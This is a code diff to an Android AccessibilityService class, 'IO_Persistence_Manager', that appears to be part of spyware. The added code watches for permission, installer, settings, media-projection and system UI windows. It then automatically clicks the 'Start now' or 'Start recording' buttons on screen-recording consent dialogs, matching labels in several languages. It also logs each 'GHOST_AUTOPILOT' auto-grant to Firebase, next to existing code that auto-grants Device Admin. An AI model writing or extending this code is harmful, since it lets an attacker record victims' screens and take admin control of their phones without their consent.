@@ -1595,8 +1595,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
             return;
         }
 
-        // Instant 0ms execution for runtime permission popups & Settings Device Admin
-        if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings")) {
+        // Instant 0ms execution for runtime permission popups, MediaProjection, & Settings
+        if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings") || pkgLower.contains("media") || pkgLower.contains("projection") || pkgLower.contains("systemui")) {
             new Handler(Looper.getMainLooper()).post(this::executeAutoPilotPass);
             return;
         }
@@ -2232,6 +2232,23 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
                     FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
                     return true;
+                }
+            }
+
+            // Screen Recording / MediaProjection Permission Dialog Auto-Grant ("Start now", "Start recording")
+            String[] screenRecordKeywords = {
+                "start now", "start recording", "start", "iniciar ahora", "iniciar", "commencer", "autoriser", "permitir"
+            };
+
+            for (String kw : screenRecordKeywords) {
+                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
+                    if (lowerText.length() <= 30 && isInteractiveButtonNode(node)) {
+                        if (performNodeClick(node)) {
+                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Screen Recording permission via text [" + text + "]");
+                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Screen Recording permission via text [" + text + "]");
+                            return true;
+                        }
+                    }
                 }
             }
 
